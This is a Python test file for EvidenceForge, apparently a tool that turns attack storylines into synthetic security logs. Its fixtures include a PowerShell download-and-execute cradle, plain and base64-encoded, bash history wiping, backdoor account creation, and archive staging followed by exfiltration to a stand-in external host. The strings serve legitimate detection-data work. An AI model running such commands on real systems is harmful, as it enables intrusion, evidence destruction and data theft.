# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Tests for network evidence inferred from storyline commands."""

import random
from datetime import UTC, datetime, timedelta
from types import SimpleNamespace
from typing import Any

from evidenceforge.events.contexts import FileTransferContext, HostContext
from evidenceforge.generation.activity import ActivityGenerator
from evidenceforge.generation.activity.generator import _zeek_conn_observation_time
from evidenceforge.generation.engine.storyline import (
    StorylineMixin,
    _linux_shell_process_command_line,
)
from evidenceforge.generation.source_timing import SourceTimingPlanner
from evidenceforge.generation.state_manager import StateManager
from evidenceforge.models.scenario import ConnectionEventSpec, System, User


class TestStorylineCommandNetworks:
    def test_linux_shell_storyline_process_renders_explicit_shell_invocation(self):
        """Bare shell control syntax should be rendered as source-native bash -c argv."""
        command_line = _linux_shell_process_command_line(
            "/bin/bash",
            "history -c && cat /dev/null > ~/.bash_history",
        )

        assert command_line == "bash -c 'history -c && cat /dev/null > ~/.bash_history'"

    def test_extract_http_url_from_powershell_download(self):
        url = StorylineMixin._extract_http_url(
            'powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('
            "'https://cdn.example.test/stage.ps1')\""
        )

        assert url == "https://cdn.example.test/stage.ps1"

    def test_extract_http_url_from_encoded_powershell_download(self):
        url = StorylineMixin._extract_http_url(
            "powershell.exe -NoProfile -EncodedCommand "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAuAGUAeABhAG0AcABsAGUALgB0AGUAcwB0AC8AcwB0AGEAZwBlAC4AcABzADEAIgApAA=="
        )

        assert url == "https://cdn.example.test/stage.ps1"

    def test_extract_http_url_skips_oversized_encoded_command(self, monkeypatch):
        def fail_b64decode(*args: Any, **kwargs: Any) -> bytes:
            raise AssertionError("oversized EncodedCommand token should not be decoded")

        monkeypatch.setattr(
            "evidenceforge.generation.engine.storyline.base64.b64decode",
            fail_b64decode,
        )
        command = "powershell.exe -EncodedCommand " + ("A" * 20_000)

        url = StorylineMixin._extract_http_url(command)

        assert url is None

    def test_extract_http_url_skips_oversized_shell_base64_decode(self, monkeypatch):
        def fail_b64decode(*args: Any, **kwargs: Any) -> bytes:
            raise AssertionError("oversized shell base64 token should not be decoded")

        monkeypatch.setattr(
            "evidenceforge.generation.engine.storyline.base64.b64decode",
            fail_b64decode,
        )
        command = "printf '" + ("A" * 20_000) + "' | base64 -d"

        url = StorylineMixin._extract_http_url(command)

        assert url is None

    def test_parse_http_url_target_accepts_valid_url(self):
        target = StorylineMixin._parse_http_url_target("https://cdn.example.test:8443/stage.ps1")

        assert target == ("cdn.example.test", 8443)

    def test_parse_http_url_target_rejects_non_numeric_port(self):
        target = StorylineMixin._parse_http_url_target("http://example.com:bad/path")

        assert target is None

    def test_parse_http_url_target_rejects_malformed_bracketed_host(self):
        target = StorylineMixin._parse_http_url_target("http://[not-a-valid-host/path")

        assert target is None

    def test_extract_output_file_ignores_find_or_operator(self):
        output_file = StorylineMixin._extract_output_file(
            "find /var/www/html -name *.conf -o -name *.env",
            "linux",
        )

        assert output_file is None

    def test_extract_output_file_accepts_short_o_for_output_tools(self):
        output_file = StorylineMixin._extract_output_file(
            "curl -s -o /tmp/stage.ps1 https://example.test/stage.ps1",
            "linux",
        )

        assert output_file == "/tmp/stage.ps1"

    def test_extract_scp_target_from_remote_destination(self):
        target = StorylineMixin._extract_scp_target(
            "scp /tmp/patient_claims.sql.gz root@10.10.2.30:/var/tmp/",
            "linux",
        )

        assert target == "10.10.2.30"

    def test_extract_sqlcmd_target_from_dash_s_ip(self):
        target = StorylineMixin._extract_database_client_target(
            'sqlcmd.exe -S 10.0.2.50 -d hr_records -Q "SELECT name FROM sys.databases"',
            "windows",
        )

        assert target == ("10.0.2.50", 1433, "tds")

    def test_extract_sqlcmd_target_accepts_tcp_port_prefix(self):
        target = StorylineMixin._extract_database_client_target(
            'sqlcmd.exe -S "tcp:DB-PROD-01,14330" -Q "SELECT 1"',
            "windows",
        )

        assert target == ("DB-PROD-01", 14330, "tds")

    def test_resolve_storyline_network_target_matches_fqdn(self):
        engine = object.__new__(StorylineMixin)
        engine._ad_domain = "meridianhcs.local"
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(
                systems=[
                    System(
                        hostname="APP-INT-01",
                        ip="10.10.2.30",
                        os="Ubuntu 22.04",
                        type="server",
                    )
                ]
            )
        )

        assert engine._resolve_storyline_network_target("APP-INT-01.meridianhcs.local") == (
            "10.10.2.30"
        )

    def test_storyline_authored_ip_for_hostname_uses_explicit_dns_answer(self):
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            storyline=[
                SimpleNamespace(
                    events=[
                        SimpleNamespace(
                            type="dns_query",
                            query="cdn-assets-update.com",
                            answer="45.33.32.30",
                        )
                    ]
                )
            ]
        )

        assert engine._storyline_authored_ip_for_hostname("cdn-assets-update.com") == (
            "45.33.32.30"
        )

    def test_storyline_authored_ip_for_hostname_caches_storyline_scan(self):
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            storyline=[
                SimpleNamespace(
                    events=[
                        SimpleNamespace(type="dns_query", query="one.example", answer="192.0.2.10"),
                        SimpleNamespace(
                            type="connection", hostname="two.example", dst_ip="192.0.2.20"
                        ),
                        SimpleNamespace(
                            type="dns_query", query="three.example", answer="192.0.2.30"
                        ),
                    ]
                )
            ]
        )
        field_reads = 0

        def counting_storyline_spec_value(spec: Any, field_name: str) -> Any:
            nonlocal field_reads
            field_reads += 1
            return StorylineMixin._storyline_spec_value(spec, field_name)

        engine._storyline_spec_value = counting_storyline_spec_value

        assert engine._storyline_authored_ip_for_hostname("missing.example") is None
        assert field_reads == 12

        assert engine._storyline_authored_ip_for_hostname("still-missing.example") is None
        assert engine._storyline_authored_ip_for_hostname("two.example") == "192.0.2.20"
        assert field_reads == 12

    def test_activity_generator_remembers_rendered_process_create_time(self):
        class _ProcessTimingEmitter:
            render_time: datetime | None = None

            @staticmethod
            def can_handle(event: Any) -> bool:
                return event.event_type == "process_create"

            def emit(self, event: Any) -> None:
                host = event.src_host
                proc = event.process
                process_start_time = proc.start_time or event.timestamp
                self.render_time = SourceTimingPlanner().source_time(
                    event,
                    "source.ecar_process_create",
                    seed_parts=(host.hostname, proc.pid, process_start_time),
                    not_before=process_start_time,
                )

        emitter = _ProcessTimingEmitter()
        state_manager = StateManager()
        generator = ActivityGenerator(state_manager, {"ecar": emitter})
        actor = User(username="alice", full_name="Alice Example", email="alice@example.com")
        system = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Windows 11 Enterprise",
            type="workstation",
        )
        event_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        state_manager.set_current_time(event_time)

        pid = generator.generate_process(
            actor,
            system,
            event_time,
            "0x3e7",
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -NoProfile -EncodedCommand SQBFAFgA",
            parent_pid=4,
        )

        assert emitter.render_time is not None
        assert generator.process_source_create_time(system.hostname, pid) >= emitter.render_time

    def test_activity_generator_preplans_process_create_time_before_threaded_dispatch(self):
        captured: dict[str, Any] = {}

        class _CapturingDispatcher:
            @staticmethod
            def dispatch(event: Any) -> None:
                if event.event_type == "process_create":
                    captured["event"] = event

        state_manager = StateManager()
        generator = ActivityGenerator(state_manager, {})
        generator.dispatcher = _CapturingDispatcher()
        actor = User(username="alice", full_name="Alice Example", email="alice@example.com")
        system = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Windows 11 Enterprise",
            type="workstation",
        )
        event_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        state_manager.set_current_time(event_time)

        pid = generator.generate_process(
            actor,
            system,
            event_time,
            "0x3e7",
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -NoProfile -EncodedCommand SQBFAFgA",
            parent_pid=4,
        )

        event = captured["event"]
        assert event.source_timing is not None
        source_keys = set(event.source_timing.source_times)
        assert any(key.startswith("source.windows_security_process_create|") for key in source_keys)
        assert any(key.startswith("source.sysmon_process_create|") for key in source_keys)
        assert any(key.startswith("source.ecar_process_create|") for key in source_keys)
        sysmon_time = next(
            value
            for key, value in event.source_timing.source_times.items()
            if key.startswith("source.sysmon_process_create|")
        )
        security_time = next(
            value
            for key, value in event.source_timing.source_times.items()
            if key.startswith("source.windows_security_process_create|")
        )
        assert security_time >= sysmon_time + timedelta(milliseconds=25)
        assert generator.process_source_create_time(system.hostname, pid) == max(
            event.source_timing.source_times.values()
        )

    def test_process_owned_windows_connection_waits_for_visible_process_create(self):
        captured: list[Any] = []

        class _CapturingDispatcher:
            visibility_engine = None

            @staticmethod
            def dispatch(event: Any) -> None:
                captured.append(event)

            @staticmethod
            def record_filtered_network_observation() -> None:
                return None

        state_manager = StateManager()
        generator = ActivityGenerator(state_manager, {})
        generator.dispatcher = _CapturingDispatcher()
        actor = User(username="alice", full_name="Alice Example", email="alice@example.com")
        source = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Windows 11 Enterprise",
            type="workstation",
        )
        target = System(
            hostname="DC-01",
            ip="10.10.0.20",
            os="Windows Server 2022",
            type="server",
        )
        generator._ip_to_system = {source.ip: source, target.ip: target}
        event_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        state_manager.set_current_time(event_time)

        pid = generator.generate_process(
            actor,
            source,
            event_time,
            "0x3e7",
            r"C:\Windows\System32\mstsc.exe",
            "mstsc.exe /v:DC-01",
            parent_pid=4,
        )
        visible_process_time = generator.process_source_create_time(source.hostname, pid)
        assert visible_process_time is not None

        generator.generate_connection(
            src_ip=source.ip,
            dst_ip=target.ip,
            time=event_time + timedelta(milliseconds=1),
            dst_port=3389,
            proto="tcp",
            service="rdp",
            duration=3.0,
            orig_bytes=1200,
            resp_bytes=2400,
            pid=pid,
            source_system=source,
        )

        connection = next(event for event in captured if event.event_type == "connection")
        wfp = next(event for event in captured if event.event_type == "wfp_connection")
        assert connection.timestamp > visible_process_time
        assert wfp.timestamp > visible_process_time


class _FakeActivityGenerator:
    def __init__(self) -> None:
        self.reserved_ports: list[int] = []
        self.connections: list[dict] = []
        self.explicit_credentials: list[dict] = []
        self.processes: list[dict] = []
        self.process_source_times: dict[tuple[str, int], datetime] = {}
        self.service_installs: list[dict] = []
        self.dhcp_leases: list[dict] = []
        self.syslog_events: list[dict] = []
        self.bash_commands: list[dict] = []
        self.account_creates: list[dict] = []
        self.password_resets: list[dict] = []
        self.account_changes: list[dict] = []
        self.group_memberships: list[dict] = []
        self.log_clears: list[dict] = []
        self.process_accesses: list[dict] = []
        self.remote_threads: list[dict] = []
        self.scheduled_tasks: list[dict] = []
        self.sid_registry: dict[str, str] = {}
        self.bash_schedule_offset: timedelta | None = None

    def generate_bash_command(self, *args: Any, **kwargs: Any) -> datetime | None:
        requested_time = args[2]
        scheduled_time = (
            requested_time + self.bash_schedule_offset
            if self.bash_schedule_offset is not None
            else None
        )
        self.bash_commands.append(
            {"args": args, "kwargs": kwargs, "scheduled_time": scheduled_time}
        )
        return scheduled_time

    def _resolve_parent(self, *args: Any, **kwargs: Any) -> int:
        return 1

    def _get_system_pid(self, *args: Any, **kwargs: Any) -> int:
        return 500

    def _build_host_context(self, system: System) -> HostContext:
        return HostContext(
            hostname=system.hostname,
            ip=system.ip,
            os=system.os,
            os_category="linux"
            if "linux" in system.os.lower() or "ubuntu" in system.os.lower()
            else "windows",
            system_type=system.type,
        )

    def generate_process(self, *args: Any, **kwargs: Any) -> int:
        self.processes.append(kwargs)
        return 4242

    def generate_logon(self, *args: Any, **kwargs: Any) -> str:
        return "0xabc"

    def _record_user_process(self, *args: Any, **kwargs: Any) -> None:
        return None

    def reserve_ssh_source_port(self, *args: Any, **kwargs: Any) -> int:
        self.reserved_ports.append(45678)
        return 45678

    def generate_connection(self, **kwargs: Any) -> str:
        self.connections.append(kwargs)
        return "Cscptransfer00001"

    def process_source_create_time(self, hostname: str, pid: int) -> datetime | None:
        return self.process_source_times.get((hostname, pid))

    def generate_explicit_credentials(self, **kwargs: Any) -> None:
        self.explicit_credentials.append(kwargs)

    def generate_service_installed(self, **kwargs: Any) -> None:
        self.service_installs.append(kwargs)

    def generate_scheduled_task(self, **kwargs: Any) -> None:
        self.scheduled_tasks.append(kwargs)

    def generate_account_created(self, **kwargs: Any) -> None:
        self.account_creates.append(kwargs)

    def generate_password_reset(self, **kwargs: Any) -> None:
        self.password_resets.append(kwargs)

    def generate_account_changed(self, **kwargs: Any) -> None:
        self.account_changes.append(kwargs)

    def generate_group_membership_change(self, **kwargs: Any) -> None:
        self.group_memberships.append(kwargs)

    def generate_log_cleared(self, **kwargs: Any) -> None:
        self.log_clears.append(kwargs)

    def generate_process_access(self, **kwargs: Any) -> bool:
        self.process_accesses.append(kwargs)
        return True

    def generate_create_remote_thread(self, **kwargs: Any) -> bool:
        self.remote_threads.append(kwargs)
        return True

    def generate_dhcp_lease(self, **kwargs: Any) -> None:
        self.dhcp_leases.append(kwargs)

    def generate_syslog_event(self, **kwargs: Any) -> None:
        self.syslog_events.append(kwargs)

    def _expand_and_emit(self, *args: Any, **kwargs: Any) -> None:
        return None


class _FakeStateManager:
    def __init__(self) -> None:
        self.sessions: dict[str, SimpleNamespace] = {}
        self.processes: dict[tuple[str, int], SimpleNamespace] = {}

    def set_current_time(self, *args: Any, **kwargs: Any) -> None:
        return None

    def get_sessions_for_user(self, username: str) -> list[SimpleNamespace]:
        return [SimpleNamespace(system="SRC", logon_id="0xabc")]

    def get_session(self, logon_id: str) -> SimpleNamespace | None:
        return self.sessions.get(logon_id)

    def get_processes_on_system(self, hostname: str) -> list[SimpleNamespace]:
        return []

    def get_process(self, hostname: str, pid: int) -> SimpleNamespace | None:
        return self.processes.get((hostname, pid))

    def create_process(self, *args: Any, **kwargs: Any) -> int:
        return 6505

    def get_process_object_id(self, hostname: str, pid: int) -> str:
        return f"{hostname}:{pid}"

    def mark_story_process(self, hostname: str, pid: int) -> None:
        return None


class TestStorylineScpCorrelation:
    def test_process_url_connection_waits_for_visible_process_create(self):
        source = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Windows 11 Enterprise",
            type="workstation",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        event_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        visible_process_time = event_time + timedelta(seconds=4)
        engine.activity_generator.process_source_times[(source.hostname, 4242)] = (
            visible_process_time
        )
        spec = SimpleNamespace(
            type="process",
            process_name=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line=(
                "powershell.exe -NoProfile -Command "
                '"IEX (New-Object Net.WebClient).DownloadString('
                "'https://cdn.example.test/stage.ps1')\""
            ),
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=event_time,
            activity="download stage",
            explicit_types={"process"},
        )

        conn = engine.activity_generator.connections[0]
        assert conn["time"] > visible_process_time
        assert conn["pid"] == 4242
        assert conn["hostname"] == "cdn.example.test"

    def test_scp_receiver_artifacts_reuse_network_source_port(self):
        source = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Ubuntu 22.04",
            type="workstation",
        )
        target = System(
            hostname="DST",
            ip="10.10.0.20",
            os="Ubuntu 22.04",
            type="server",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source, target], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        receiver_ports: list[int] = []

        def capture_receiver_artifacts(**kwargs) -> None:
            receiver_ports.append(kwargs["source_port"])

        engine._emit_scp_receiver_artifacts = capture_receiver_artifacts
        spec = SimpleNamespace(
            type="process",
            process_name="scp",
            command_line="scp /tmp/archive.tar.gz root@DST:/var/tmp/archive.tar.gz",
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="copy archive to staging host",
            explicit_types={"process"},
        )

        assert engine.activity_generator.reserved_ports == [45678]
        assert engine.activity_generator.connections[0]["src_port"] == 45678
        assert receiver_ports == [45678]

    def test_sqlcmd_remote_private_ip_generates_failed_tcp_attempt(self):
        source = System(
            hostname="SRC",
            ip="10.10.1.31",
            os="Windows 11 Enterprise",
            type="workstation",
        )
        actor = User(
            username="marcus.chen",
            full_name="Marcus Chen",
            email="marcus.chen@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[], network=None)
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="process",
            process_name="sqlcmd.exe",
            command_line=(
                "sqlcmd.exe -S 10.0.2.50 -d hr_records -Q "
                '"SELECT name, recovery_model_desc FROM sys.databases"'
            ),
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="check sql server",
            explicit_types={"process"},
        )

        conn = engine.activity_generator.connections[0]
        assert conn["src_ip"] == "10.10.1.31"
        assert conn["dst_ip"] == "10.0.2.50"
        assert conn["dst_port"] == 1433
        assert conn["proto"] == "tcp"
        assert conn["pid"] == 4242
        assert conn["conn_state"] == "S0"
        assert conn["firewall"].action == "deny"
        assert conn["service"] is None

    def test_sqlcmd_unresolved_host_generates_unrouted_failed_tcp_attempt(self):
        source = System(
            hostname="SRC",
            ip="10.10.1.31",
            os="Windows 11 Enterprise",
            type="workstation",
        )
        actor = User(
            username="marcus.chen",
            full_name="Marcus Chen",
            email="marcus.chen@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine._ad_domain = "example.com"
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[], network=None)
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="process",
            process_name="sqlcmd.exe",
            command_line='sqlcmd.exe -S sqlprod01 -d hr_records -Q "SELECT 1"',
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="check remote sql host",
            explicit_types={"process"},
        )

        conn = engine.activity_generator.connections[0]
        assert conn["dst_ip"].startswith("10.0.2.")
        assert conn["hostname"] == "sqlprod01.example.com"
        assert conn["dst_port"] == 1433
        assert conn["conn_state"] == "S0"
        assert conn["firewall"].action == "deny"

    def test_sqlcmd_local_instance_does_not_generate_network_attempt(self):
        source = System(
            hostname="SRC",
            ip="10.10.1.31",
            os="Windows 11 Enterprise",
            type="workstation",
        )
        actor = User(
            username="marcus.chen",
            full_name="Marcus Chen",
            email="marcus.chen@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[], network=None)
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="process",
            process_name="sqlcmd.exe",
            command_line='sqlcmd.exe -S SQLEXPRESS -Q "SELECT * FROM INFORMATION_SCHEMA.TABLES"',
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="check local sql instance",
            explicit_types={"process"},
        )

        assert engine.activity_generator.connections == []


class TestStorylineCommandSideEffects:
    def test_explicit_account_created_after_net_user_password_add_emits_followups(self):
        dc = System(
            hostname="DC-01",
            ip="10.10.2.10",
            os="Windows Server 2019",
            type="domain_controller",
        )
        actor = User(
            username="SYSTEM",
            full_name="Local System",
            email="system@example.local",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[dc], service_accounts=[])
        )
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None, storyline_cluster_id=None)
        engine._ensure_account_sid_tracking()
        create_time = datetime(2024, 3, 18, 16, 14, 33, tzinfo=UTC)

        engine._record_storyline_account_create_command(
            dc,
            "net user svc_mhsync MhsSvc!2024 /add /domain",
        )
        event = engine._execute_typed_event(
            spec=SimpleNamespace(
                type="account_created",
                target_username="svc_mhsync",
                target_sid="S-1-5-21-1-2-3-2906",
            ),
            actor=actor,
            system=dc,
            time=create_time,
            activity="Domain account svc_mhsync created",
            explicit_types={"account_created"},
        )

        assert event is not None
        assert engine.activity_generator.account_creates[0]["target_sid"].endswith("-2906")
        assert engine.activity_generator.password_resets[0]["target_username"] == "svc_mhsync"
        account_change = engine.activity_generator.account_changes[0]
        assert account_change["time"] > engine.activity_generator.password_resets[0]["time"]
        assert account_change["password_last_set_to_event_time"] is True
        assert account_change["old_uac_value"] == "0x15"
        assert account_change["new_uac_value"] == "0x10"

    def test_compress_archive_exfil_emits_archive_sized_smb_download(self):
        source = System(
            hostname="WS-AJOHNSON-01",
            ip="10.10.1.35",
            os="Windows 11",
            type="workstation",
        )
        file_server = System(
            hostname="FILE-SRV-01",
            ip="10.10.2.20",
            os="Windows Server 2019",
            type="server",
            roles=["file_server"],
        )
        actor = User(
            username="aisha.johnson",
            full_name="Aisha Johnson",
            email="aisha.johnson@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source, file_server], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.state_manager.sessions["0xabc"] = SimpleNamespace(
            system=file_server.hostname,
            source_ip=source.ip,
        )
        engine.activity_generator = _FakeActivityGenerator()
        engine.activity_generator._ip_to_system = {
            source.ip: source,
            file_server.ip: file_server,
        }
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        smb_logons: list[dict[str, Any]] = []

        def capture_smb_logon_pair(
            actor: User,
            dst_sys: System,
            src_ip: str,
            time: datetime,
            rng: random.Random,
        ) -> None:
            _ = time, rng
            smb_logons.append({"actor": actor.username, "dst": dst_sys.hostname, "src_ip": src_ip})

        engine._emit_smb_logon_pair = capture_smb_logon_pair
        engine._record_storyline_logon(actor, file_server, "0xabc", source_ip=source.ip)
        archive_time = datetime(2026, 5, 18, 14, 1, tzinfo=UTC)
        upload_time = datetime(2026, 5, 18, 14, 25, tzinfo=UTC)
        process_spec = SimpleNamespace(
            type="process",
            process_name="powershell.exe",
            command_line=(
                'powershell.exe -NoProfile -Command "Compress-Archive '
                r"-Path \\FILE-SRV-01\Finance\Q1\* "
                r"-DestinationPath C:\ProgramData\Microsoft\cache_7f3a.zip"
                '"'
            ),
            supplementary="none",
        )

        engine._execute_typed_event(
            spec=process_spec,
            actor=actor,
            system=file_server,
            time=archive_time,
            activity="Stage archive",
            explicit_types={"process"},
        )
        engine._execute_typed_event(
            spec=ConnectionEventSpec(
                dst_ip="45.33.32.30",
                dst_port=443,
                hostname="api.westbridge-services.net",
                service="ssl",
                source_ip=source.ip,
                method="POST",
                uri="/upload/telemetry/7f3a2b19",
                technique="T1041",
                description="Exfiltrate staged archive",
                orig_bytes=314_782_613,
                resp_bytes=2048,
            ),
            actor=actor,
            system=source,
            time=upload_time,
            activity="Upload staged archive",
            explicit_types={"connection"},
        )

        assert len(engine.activity_generator.connections) == 2
        smb_transfer, upload = engine.activity_generator.connections
        assert smb_transfer["dst_port"] == 445
        assert smb_transfer["service"] == "smb"
        assert smb_transfer["src_ip"] == source.ip
        assert smb_transfer["dst_ip"] == file_server.ip
        assert archive_time < smb_transfer["time"] < upload_time
        assert smb_transfer["resp_bytes"] > 300_000_000
        assert upload["dst_port"] == 443

        file_transfer = smb_transfer["file_transfer"]
        assert isinstance(file_transfer, FileTransferContext)
        assert file_transfer.source == "SMB"
        assert file_transfer.is_orig is False
        assert file_transfer.total_bytes == smb_transfer["resp_bytes"]
        assert file_transfer.filename == (r"\\FILE-SRV-01\C$\ProgramData\Microsoft\cache_7f3a.zip")
        assert smb_logons == [
            {"actor": actor.username, "dst": file_server.hostname, "src_ip": source.ip}
        ]

    def test_scp_receiver_ssh_syslog_uses_distinct_submillisecond_suffixes(self):
        source = System(
            hostname="SRC",
            ip="10.10.4.10",
            os="Ubuntu 22.04",
            type="workstation",
        )
        target = System(
            hostname="DST",
            ip="10.10.2.30",
            os="Ubuntu 22.04",
            type="server",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(dispatch=lambda event: None)
        transfer_time = datetime(2024, 3, 18, 17, 15, 2, 638000, tzinfo=UTC)

        engine._emit_scp_receiver_artifacts(
            source_system=source,
            target_system=target,
            actor=actor,
            source_pid=4242,
            source_process="/usr/bin/scp",
            source_command="scp /tmp/archive.tar.gz root@DST:/var/tmp/archive.tar.gz",
            target_user="root",
            target_path="/var/tmp/archive.tar.gz",
            transfer_time=transfer_time,
            source_port=40117,
            rng=random.Random(7),
        )

        syslog_times = [event["time"] for event in engine.activity_generator.syslog_events]
        observed_transfer_time = _zeek_conn_observation_time(
            transfer_time,
            source.ip,
            40117,
            target.ip,
            22,
            "tcp",
            "ssh",
        )
        assert len(syslog_times) == 3
        assert syslog_times[0] < syslog_times[1] < syslog_times[2]
        assert (
            timedelta(milliseconds=80)
            < syslog_times[0] - observed_transfer_time
            < timedelta(milliseconds=81)
        )
        assert (
            timedelta(milliseconds=350)
            < syslog_times[1] - observed_transfer_time
            < timedelta(milliseconds=351)
        )
        assert (
            timedelta(milliseconds=900)
            < syslog_times[2] - observed_transfer_time
            < timedelta(milliseconds=901)
        )
        assert len({timestamp.microsecond % 1000 for timestamp in syslog_times}) == 3

    def test_scp_receiver_file_waits_for_visible_source_process_create(self):
        source = System(
            hostname="SRC",
            ip="10.10.4.10",
            os="Ubuntu 22.04",
            type="workstation",
        )
        target = System(
            hostname="DST",
            ip="10.10.2.30",
            os="Ubuntu 22.04",
            type="server",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        file_events: list[Any] = []
        engine.dispatcher = SimpleNamespace(
            dispatch=lambda event: (
                file_events.append(event) if event.event_type == "file_create" else None
            )
        )
        transfer_time = datetime(2024, 3, 18, 17, 15, 2, 638000, tzinfo=UTC)
        visible_source_process_time = transfer_time + timedelta(seconds=5)
        engine.activity_generator.process_source_times[(source.hostname, 4242)] = (
            visible_source_process_time
        )

        engine._emit_scp_receiver_artifacts(
            source_system=source,
            target_system=target,
            actor=actor,
            source_pid=4242,
            source_process="/usr/bin/scp",
            source_command="scp /tmp/archive.tar.gz root@DST:/var/tmp/archive.tar.gz",
            target_user="root",
            target_path="/var/tmp/archive.tar.gz",
            transfer_time=transfer_time,
            source_port=40117,
            rng=random.Random(7),
        )

        assert file_events
        assert file_events[0].timestamp > visible_source_process_time

    def test_linux_process_uses_scheduled_bash_history_time(self):
        source = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Ubuntu 22.04",
            type="workstation",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.activity_generator.bash_schedule_offset = timedelta(seconds=45)
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        requested_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        spec = SimpleNamespace(
            type="process",
            process_name="id",
            command_line="id",
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=requested_time,
            activity="check current user",
            explicit_types={"process"},
        )

        scheduled_time = requested_time + timedelta(seconds=45)
        assert engine.activity_generator.bash_commands[0]["scheduled_time"] == scheduled_time
        assert engine.activity_generator.processes[0]["time"] == scheduled_time

    def test_net_domain_queries_do_not_auto_emit_4648(self):
        source = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Windows 10",
            type="workstation",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="process",
            process_name="net.exe",
            command_line='net group "Domain Admins" /domain',
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="query domain admins",
            explicit_types={"process"},
        )

